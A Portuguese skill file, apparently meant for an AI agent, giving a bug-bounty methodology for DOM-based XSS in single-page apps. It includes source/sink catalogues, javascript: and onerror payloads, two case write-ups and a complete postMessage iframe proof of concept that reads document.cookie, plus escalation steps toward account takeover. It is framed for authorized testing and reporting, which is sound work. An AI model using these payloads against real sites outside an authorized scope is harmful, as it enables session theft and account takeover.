---
name: dom-xss
description: Metodologia de DOM-based XSS por code review de JavaScript, para bug bounty e pentest autorizado. Use SEMPRE que o alvo for uma SPA (React, Vue, Angular, Svelte, Next.js) ou carregar bundles JavaScript, e sempre que o usuário mencionar "DOM XSS", "dom based", "source e sink", "innerHTML", "location.hash", "postMessage", "dangerouslySetInnerHTML", "v-html", "javascript: URI", "code review de js". O PIVÔ CENTRAL da skill é a TABELA DE ROTAS: numa SPA o bundle JavaScript declara TODAS as rotas do cliente, inclusive as que a interface nunca mostra — então pesquisa-se o window.location.pathname atual dentro dos .js carregados para achar a declaração da rota, e a partir dela lê-se a tabela inteira, descobrindo rotas ocultas (parceiros, admin, fluxos internos); cada rota aponta para um NOME DE COMPONENTE, e pesquisar esse nome revela o arquivo dedicado dele (ex.: /static/js/components/ZPartner02MemberSigninSuccess.js) — que é onde se faz o code review de source para sink. Cobre: catálogo completo de sources (location.search/hash/pathname, document.referrer, window.name, postMessage, storage, URLSearchParams.get, e os equivalentes de cada framework como useSearchParams, this.props.location.search, $route.query, ActivatedRoute.queryParams) e de sinks separados por categoria — execução (eval, Function, setTimeout com string), injeção de HTML (innerHTML, document.write, insertAdjacentHTML, jQuery $(), dangerouslySetInnerHTML, v-html, bypassSecurityTrustHtml) e NAVEGAÇÃO (location.href, location.assign, window.open, atributos href/src/action), sendo os de navegação exploráveis com URI javascript: e data:; POSTMESSAGE como superfície própria — handler window.addEventListener("message") sem validação de event.origin levando innerHTML ou execução dinâmica de JS, especialmente o padrão self !== top que registra o handler SÓ quando a página está dentro de um iframe (código nunca exercitado na navegação normal, logo raramente revisado), explorável apenas quando faltam X-Frame-Options e CSP frame-ancestors, com PoC de iframe que respeita a sequência e o timing esperados pelo handler; diferença entre sink automático e sink que exige interação do usuário (clique), o que muda a severidade; como baixar todos os bundles; e escalada de DOM XSS para account takeover. Só usar dentro do escopo formalmente autorizado.
---

# DOM-based XSS por Code Review

Metodologia para achar XSS que nasce e morre no navegador — o servidor nunca vê
o payload, e por isso WAF, filtro de entrada e sanitização server-side não
pegam nada.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.
O PoC de DOM XSS afeta apenas o seu próprio navegador — use `alert(1)` ou
`alert(document.domain)` e pare aí. Nunca aponte o payload para outro usuário.

## 1. A ideia central

```
   SOURCE                      FLUXO                       SINK
   dado que o atacante   -->   o código passa       -->   função que
   controla no cliente         adiante, às vezes          EXECUTA ou
   (URL, hash, message)        "processando"              NAVEGA
```

O bug existe quando um **source** chega a um **sink** sem validação. Todo o
trajeto acontece no JavaScript do cliente — nada disso passa pelo servidor.

Consequência prática: **o payload pode nem ser enviado ao servidor.** Um payload
no fragmento (`#...`) nunca sai do navegador. Por isso essa classe sobrevive em
alvos com WAF forte e com o resto da aplicação bem sanitizada.

## 2. O pivô — a tabela de rotas da SPA

Esta é a técnica que estrutura a skill, e é o que separa varredura cega de
análise dirigida.

**Numa SPA, o bundle JavaScript declara TODAS as rotas do cliente** — inclusive
as que a interface nunca mostra: fluxos de parceiro, telas de erro, páginas de
teste, áreas administrativas.

### Passo 1 — Pesquisar o path atual dentro dos JS carregados

Navegue pela aplicação, pegue o `window.location.pathname` da página em que
está, e procure essa string nos `.js` que a página carregou:

```
URL:  http://alvo.com/promograbsr
```

```js
// achado no bundle:
Pe.jsx)(se, {
    exact: !0,
    path: "/promograbsr",
    component: ts
})
```

Achou a declaração da rota → você está **dentro da tabela de rotas**.

### Passo 2 — Ler a tabela inteira

Ao redor daquela declaração está o resto do roteamento. É aqui que aparecem as
rotas que a interface nunca linka:

```jsx
// #region Partner-Route "LineMan"
<Route exact path='/x02lineman' component={ZPartner02} />
<Route exact path='/x02lineman/error' component={ZPartner02Error} />
<Route exact path='/x02lineman/home' component={ZPartner02Home} />
<Route exact path='/x02lineman/xtest' component={ZPartner02Xtest} />
<Route exact path='/x02lineman/membersignin' component={ZPartner02MemberSignin} />
<Route exact path='/x02lineman/membersigninsuccess' component={ZPartner02MemberSigninSuccess} />
<Route exact path='/x02lineman/membernew' component={ZPartner02MemberNew} />
...
```

Extraia todas com regex:

```bash
grep -ohE '"?path"?\s*:\s*["'\''][^"'\'']+["'\'']' bundles/*.js | sort -u
grep -ohE "path=['\"][^'\"]+['\"]" bundles/*.js | sort -u
grep -ohE 'component\s*[:=]\s*\{?[A-Za-z0-9_$]+' bundles/*.js | sort -u
```

**Priorize por nome.** Rotas que rendem: `partner`, `admin`, `internal`, `test`,
`debug`, `xtest`, `callback`, `redirect`, `success`, `error`, `sso`, `oauth`,
`preview`, `legacy`, `v1`.

### Passo 3 — Do componente para o arquivo dele

Cada rota aponta para um **nome de componente**. Pesquisar esse nome costuma
revelar o arquivo dedicado:

```
componente:  ZPartner02MemberSigninSuccess
arquivo:     /static/js/components/ZPartner02MemberSigninSuccess.js
```

```bash
grep -rl 'ZPartner02MemberSigninSuccess' bundles/
curl -s "https://alvo.com/static/js/components/ZPartner02MemberSigninSuccess.js" -o comp.js
```

Se o build for um bundle único, o componente está lá dentro — localize pelo nome
e leia o bloco.

### Passo 4 — Code review do componente

Agora é leitura dirigida: procure o source, siga até o sink.

**Por que essa ordem funciona:** você deixa de procurar `innerHTML` em 3 MB de
bundle minificado e passa a ler o arquivo de uma rota específica, escolhida
porque o nome dela sugere um fluxo pouco testado. É a diferença entre grep e
análise.

### Baixar todos os bundles

Vale sempre — nem toda rota aparece nos JS que a página atual carrega:

```bash
mkdir -p bundles && cd bundles
curl -s https://alvo.com/ | grep -oE 'src="[^"]+\.js[^"]*"' | cut -d'"' -f2 | \
while read u; do
  case "$u" in http*) U="$u";; /*) U="https://alvo.com$u";; *) U="https://alvo.com/$u";; esac
  curl -s "$U" -O -J 2>/dev/null || curl -s "$U" -o "$(basename "${u%%\?*}")"
done
# procurar chunks referenciados dentro do bundle principal
grep -ohE '"[a-zA-Z0-9_/.-]+\.chunk\.js"|"static/js/[^"]+\.js"' *.js | tr -d '"' | sort -u
```

A skill `bughunter` cobre essa coleta e a análise ampla dos JS — use as duas em
conjunto.

## 3. Catálogo de sources

Tudo que o atacante controla e chega ao JavaScript:

**URL**
```js
location.search        location.hash        location.pathname
location.href          location.host        location
document.URL           document.documentURI document.baseURI
new URLSearchParams(location.search).get("x")
new URL(location.href).searchParams.get("x")
```

**Fora da URL**
```js
document.referrer      window.name          document.cookie
localStorage.getItem() sessionStorage.getItem()
history.state          event.data           // postMessage
```

**Equivalentes por framework**
```js
// React Router
this.props.location.search      useLocation().search
useSearchParams()[0].get("x")   useParams()

// Vue
this.$route.query.x             this.$route.params.x

// Angular
this.route.snapshot.queryParams['x']
this.route.queryParams.subscribe(...)

// Next.js
useRouter().query.x             router.asPath
```

**`window.name` e `document.referrer` são subestimados** — o atacante controla
os dois a partir da página que abre a vítima, e quase ninguém os valida.

**`postMessage` merece atenção própria**: procure `addEventListener("message"`
e verifique se há checagem de `event.origin`. Sem essa checagem, qualquer site
manda dado para dentro da aplicação. **Caso completo e como caçar: seção 8.1** —
inclusive o padrão `self !== top`, que esconde handlers que só rodam em iframe.

## 4. Catálogo de sinks

### 4.1 Execução direta

```js
eval(x)                  new Function(x)()        Function(x)
setTimeout(x, 0)         setInterval(x, 0)        // com STRING, não função
execScript(x)
```

### 4.2 Injeção de HTML

```js
el.innerHTML = x         el.outerHTML = x         el.insertAdjacentHTML(p, x)
document.write(x)        document.writeln(x)
range.createContextualFragment(x)
new DOMParser().parseFromString(x, "text/html")

// jQuery
$(x)   $(el).html(x)   .append(x)   .prepend(x)   .after(x)   .before(x)
.replaceWith(x)   .wrap(x)

// frameworks
dangerouslySetInnerHTML={{__html: x}}       // React
v-html="x"                                   // Vue
[innerHTML]="x"   bypassSecurityTrustHtml(x) // Angular
```

### 4.3 Navegação e URL — os mais comuns e mais esquecidos

```js
location = x             location.href = x        location.assign(x)
location.replace(x)      window.open(x)
a.href = x               iframe.src = x           script.src = x
form.action = x          button.formAction = x
```

**Por que esses são exploráveis:** aceitam URI `javascript:` e `data:`. Não é
preciso injetar tag nenhuma — basta que o valor comece com `javascript:`.

```
?S=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>
```

**É o sink do caso real da seção 8**, e o mais frequente em SPA, porque
"redirecionar para onde o parâmetro mandar" parece inofensivo para quem escreve.

### 4.4 Atributos e outros

```js
el.setAttribute("onclick", x)      el.srcdoc = x
el.style = x                       // exfiltração via CSS
new WebSocket(x)                   fetch(x)      // SSRF client-side / leak
```

## 5. Sink automático vs sink com interação

Distinção que **muda a severidade** e precisa estar clara no report:

| Tipo | Comportamento | Severidade |
|---|---|---|
| **Automático** | Dispara ao carregar a página | Maior — basta a vítima abrir o link |
| **Com interação** | Exige clique, hover, submit | Menor — 1-click, mas ainda válido |

```js
// automático — roda no mount
useEffect(() => { window.location.href = param }, [])

// com interação — só no clique
<a href={param} onClick={(e) => { window.location.href = param }}>
```

O caso da seção 8 é **1-click**: a vítima precisa clicar no botão. Ainda assim
foi aceito e pago. **Não descarte um sink por exigir clique** — descreva
honestamente a interação necessária e deixe o programa calibrar.

## 6. Fluxo de execução

```
1. Coletar todos os bundles JS                      (seção 2)
2. Pesquisar o pathname atual dentro deles          -> acha a tabela de rotas
3. Extrair TODAS as rotas + nomes de componente
4. Priorizar rotas pouco testadas (partner, admin, xtest, callback, success)
5. Para cada rota escolhida: achar o arquivo do componente
6. Code review: localizar SOURCE, seguir o fluxo até o SINK
7. Sem validação no caminho? -> montar o PoC
8. Confirmar no navegador com o devtools
9. Avaliar escalada (seção 9)
```

O passo 4 é o que rende: rota de parceiro e fluxo de callback quase nunca
recebem a mesma revisão de segurança do fluxo principal.

## 7. Confirmação

**Ache o ponto exato antes de testar payload.** No DevTools:

```js
// pare quando o valor for atribuído ao sink
// Sources -> Event Listener Breakpoints, ou:
debugger;
```

Para sinks de HTML, um breakpoint em `set innerHTML` funciona. Para navegação,
coloque um breakpoint na linha do `location.href`.

**Payloads de confirmação por tipo de sink:**

```
sink de navegação :  ?S=javascript:alert(document.domain)
sink de HTML      :  ?q=<img src=x onerror=alert(document.domain)>
sink de execução  :  ?q=alert(document.domain)
sink via hash     :  #<img src=x onerror=alert(document.domain)>
```

`alert(document.domain)` é melhor que `alert(1)` no report: prova em qual origem
o script executou.

**Cuidado com o falso positivo do encoding.** O navegador codifica automaticamente
parte da URL. Se o payload não disparar, confira no DevTools o valor real que
chegou ao sink — pode ter sido encodado no caminho, e aí não é vulnerável.

## 8. Caso real — rota oculta de parceiro, `javascript:` em `location.href`

Bug encontrado **puramente com o DevTools do navegador e code review dos
arquivos JavaScript**. Não é complexo, e é justamente por isso que serve de
modelo.

**Recon.** Em aplicações que usam React, Vue ou Angular, vale gastar tempo
procurando paths, sources e sinks. O método aqui foi: usar a aplicação e
pesquisar o path da URL atual (`window.location.pathname`) dentro dos arquivos
JavaScript que a aplicação carregou.

```
URL: http://alvo.co.th/promograbsr
```

```js
Pe.jsx)(se, {
    exact: !0,
    path: "/promograbsr",
    component: ts
})
```

**A tabela de rotas.** Por ser React, era provável que o JavaScript lidasse com
**todas** as rotas utilizáveis pelo cliente. Analisando os paths interessantes
em busca de algo controlável pela URL, apareceu este bloco:

```jsx
// #region Partner-Route "LineMan"
<Route exact path='/x02lineman' component={ZPartner02} />
<Route exact path='/x02lineman/error' component={ZPartner02Error} />
<Route exact path='/x02lineman/home' component={ZPartner02Home} />
<Route exact path='/x02lineman/xtest' component={ZPartner02Xtest} />
<Route exact path='/x02lineman/membersignin' component={ZPartner02MemberSignin} />
<Route exact path='/x02lineman/membersigninsuccess' component={ZPartner02MemberSigninSuccess} />
<Route exact path='/x02lineman/membernew' component={ZPartner02MemberNew} />
<Route exact path='/x02lineman/membernewthx' component={ZPartner02MemberNewStep01Thx} />
<Route exact path='/x02lineman/membenew_doactionreg' component={ZPartner02MemberNewStep02} />
<Route exact path='/x02lineman/membernewsuccess' component={ZPartner02MemberNewStep02Thx} />
{/*SR2.0*/}
<Route exact path='/x02lineman/membenew_doactionreg_20' component={ZPartner02MemberNewStep02SR20} />
// #endregion
```

**Do componente para o arquivo.** Existindo provavelmente um arquivo JS por
componente, pesquisar `ZPartner02MemberSigninSuccess` levou direto a:

```
/static/js/components/ZPartner02MemberSigninSuccess.js
```

**O trecho vulnerável:**

```jsx
render() {
    const query = new URLSearchParams(this.props.location.search);
    const param = decodeURIComponent(query.get("S") || "");

    return (
        <a href={param} className="btn btn-primary rounded-pill px-5"
           onClick={(e) => {
               e.preventDefault();
               if (!param) return;
               window.location.href = param;   // INPUT DO USUÁRIO
           }}>
            กลับไปยัง LINE MAN<br />
            <small>Back to LINE MAN</small>
        </a>
    );
}
```

O valor do query parameter `S`, obtido do source `URLSearchParams.get("S")`,
passa por `decodeURIComponent()` e é usado **diretamente** pelo sink
`window.location.href`, com **zero validação**.

**Exploração:**

```
1. A vítima acessa:
   http://alvo.co.th/x02lineman/membersigninsuccess?S=javascript:alert(1)
2. Clica no botão na tela
3. O XSS é executado
```

**Impacto:** havia caminho para um **1-click ATO**, mas faltavam os documentos
necessários do país para completar a cadeia. Aceito como **Medium 6.9**.

**Lições transferíveis:**

- Pesquisar o `pathname` atual dentro dos JS é o atalho para achar a tabela de
  rotas — e a tabela entrega rotas que a interface nunca mostra.
- Rota de **parceiro** é terreno fértil: integração feita sob prazo, com menos
  revisão que o fluxo principal. O mesmo vale para `xtest`, `error`, `success`.
- O nome do componente é a ponte para o arquivo dedicado — pesquisar por ele
  economiza horas de leitura de bundle.
- `decodeURIComponent()` **não sanitiza nada**. Ver uma "transformação" no
  caminho não significa validação.
- `href` + `window.location.href` recebendo parâmetro é o sink mais banal e um
  dos mais presentes. `javascript:` basta.
- Bug simples em programa público existe. Não presuma que já foi achado.

### 8.1 Caso real — postMessage sem validação de origem, atrás de `self !== top`

Segundo caso, de uma superfície completamente diferente: **postMessage**.

**Recon.** Procurando misconfiguração em `postMessage()`, apareceu um JS com uma
função interessante guardada atrás de `self !== top` — ou seja, o bloco **só
roda quando a página está dentro de um iframe**.

Quando essa condição é satisfeita, o script registra um
`window.addEventListener("message", ...)` que:

1. **Não valida o `event.origin`** — aceita mensagens de qualquer origem
2. **Usa campos controlados pelo atacante**, vindos de `event.data`, em sinks
   perigosos: `innerHTML` e, potencialmente, execução dinâmica de JS através de
   uma funcionalidade de "JS personalizado"

**O que destravou o ataque:** a aplicação **não aplicava proteção contra
framing** — sem `X-Frame-Options` e sem `Content-Security-Policy:
frame-ancestors`. Logo, o atacante pode embutir a página vulnerável num iframe
no próprio site malicioso e enviar payloads de `postMessage` manipulados,
disparando execução de script no contexto do alvo.

**Os tipos de mensagem que o handler processava:**

```
dk4trin_xxx_setAllChanges       -> escreve diretamente em innerHTML
dk4trin_xxx_applyElementChange  -> injeta o conteúdo fornecido em innerHTML
dk4trin_xxx_applyCustomJS       -> executava JavaScript fornecido, via função interna
```

**PoC completa:**

```html
<!DOCTYPE html>
<html>
<head><title>DOM XSS via postMessage - alvo</title></head>
<body>
<h2>DOM XSS via postMessage on alvo</h2>

<button onclick="exploit()">Launch Exploit</button>
<div id="status"></div>

<script>
function log(msg) {
    document.getElementById('status').innerHTML += msg + '<br>';
}

function exploit() {
    log('Step 1: Creating iframe with alvo...');

    var iframe = document.createElement('iframe');
    iframe.style.width = '100%';
    iframe.style.height = '500px';
    iframe.src = 'https://target/path/path/path';
    document.body.appendChild(iframe);

    iframe.onload = function() {
        log('Step 2: iframe loaded. Waiting for init...');

        setTimeout(function() {
            log('Step 3: Sending xxx_xxx_continueInit...');
            iframe.contentWindow.postMessage({
                type: "xxx_xxx_continueInit"
            }, "*");

            setTimeout(function() {
                log('Step 4: Sending XSS payload...');

                // XSS 1 - via innerHTML
                iframe.contentWindow.postMessage({
                    type: "xxx_xxx_applyElementChange",
                    data: {
                        xPath: "//body",
                        content: '<img src=x onerror="alert(document.cookie)">'
                    }
                }, "*");

                // XSS 2 - via execucao de JS
                iframe.contentWindow.postMessage({
                    type: "xxx_xxx_applyCustomJS",
                    customJS: 'confirm(document.domain)'
                }, "*");

                log('Step 5: Payloads sent!');

            }, 1000);
        }, 2000);
    };
}

window.addEventListener('message', function(e) {
    log('Received message from iframe: ' + JSON.stringify(e.data));
});
</script>
</body>
</html>
```

**Impacto:** ficou em DOM XSS simples — a escalada não fechou.

**Lições transferíveis:**

- **`self !== top` é um marcador de caça.** Código guardado atrás dessa
  condição só executa dentro de iframe, então **nunca é exercitado na navegação
  normal** — e por isso quase nunca é revisado. Faça grep por `self !== top`,
  `self != top`, `window.top !== window.self`, `parent !== window`.
- **Handler de `message` sem checagem de `origin`** é o bug; a ausência de
  `X-Frame-Options` / `frame-ancestors` é o que o torna **explorável**. Verifique
  os dois: sem framing permitido, o handler vulnerável fica inalcançável.
- **Respeite a máquina de estados do handler.** A PoC precisa de um
  `continueInit` antes dos payloads, e de `setTimeout` entre as etapas. Se o
  primeiro disparo não funcionar, pode ser ordem ou timing, não invulnerabilidade
  — leia o handler e reproduza a sequência que ele espera.
- **Enumere TODOS os `type` aceitos** pelo handler. Aqui eram três, e o
  `applyCustomJS` era o mais direto. Leia o `switch`/`if` inteiro antes de
  escolher o payload.

#### Como caçar essa classe

```bash
# 1) handlers de message
grep -nE 'addEventListener\(\s*["''']message["''']|onmessage\s*=' bundles/*.js

# 2) validacao de origin por perto? (se NAO houver, e candidato)
grep -nE 'event\.origin|e\.origin|\.origin\s*[!=]==' bundles/*.js

# 3) codigo que so roda em iframe
grep -nE 'self\s*!==?\s*top|window\.top\s*!==?\s*window\.self|parent\s*!==?\s*window' bundles/*.js
```

```bash
# 4) framing permitido? (se as duas linhas vierem vazias, esta permitido)
curl -sI https://alvo.com/pagina | grep -iE 'x-frame-options|content-security-policy'
```

## 9. Escalada — de XSS a account takeover

DOM XSS executa na origem da aplicação. A partir daí:

1. **Sessão acessível?** `document.cookie` sem `HttpOnly`, ou token em
   `localStorage` / `sessionStorage` — é o caminho mais curto.
2. **Token no estado do front?** `window.__INITIAL_STATE__`,
   `window.__NEXT_DATA__` — mesmo com `HttpOnly` o token pode estar ali (ver
   `web-cache-auth-leak`).
3. **Ações autenticadas via fetch same-origin** — trocar e-mail, adicionar
   telefone, desativar 2FA. Descreva a cadeia no report; não execute contra
   terceiros.
4. **CSRF token acessível** na página → o XSS lê o token e faz a requisição.

Para o report, **descreva** a cadeia até o ATO e demonstre apenas o passo que
prova a execução, na sua própria conta.

## 10. Reportar

1. URL completa do PoC, com o payload, pronta para colar.
2. O trecho de código vulnerável — source, fluxo e sink identificados por nome.
3. Como você chegou à rota, se ela não é linkada na interface (isso demonstra
   que é alcançável, não teórica).
4. Diga se o sink é **automático** ou exige **interação**, e qual interação.
5. Print do `alert(document.domain)` mostrando a origem.
6. Descreva a escalada possível sem executá-la contra terceiros.
7. Remediação: validar o esquema da URL antes de atribuir (permitir só `http:`
   e `https:`), lista de destinos permitidos para redirect, e `textContent` em
   vez de `innerHTML`.

## 11. Checklist

- [ ] Todos os bundles JS baixados, incluindo chunks referenciados.
- [ ] `pathname` da página atual pesquisado nos JS → tabela de rotas localizada.
- [ ] TODAS as rotas extraídas, com os nomes de componente.
- [ ] Rotas priorizadas por nome (partner, admin, xtest, callback, success, sso).
- [ ] Arquivo do componente localizado a partir do nome.
- [ ] Sources mapeados no componente (URL, hash, referrer, name, postMessage).
- [ ] Fluxo seguido do source até o sink, anotando cada transformação.
- [ ] Verificado que a transformação é decode, não validação.
- [ ] Sinks de NAVEGAÇÃO testados com `javascript:` e `data:`.
- [ ] `addEventListener("message"` verificado quanto a checagem de `origin`.
- [ ] Grep por `self !== top` / `window.top !== window.self` — código só-em-iframe.
- [ ] Todos os `type` aceitos pelo handler de `message` enumerados.
- [ ] Framing verificado: `X-Frame-Options` e CSP `frame-ancestors` ausentes?
- [ ] Sequência e timing do handler respeitados na PoC (init antes do payload).
- [ ] Confirmado no DevTools que o valor chega ao sink sem encoding.
- [ ] Classificado como automático ou com interação.
- [ ] Escalada avaliada (cookie, storage, estado do front, CSRF token).
- [ ] PoC apenas com `alert(document.domain)`, na própria sessão.
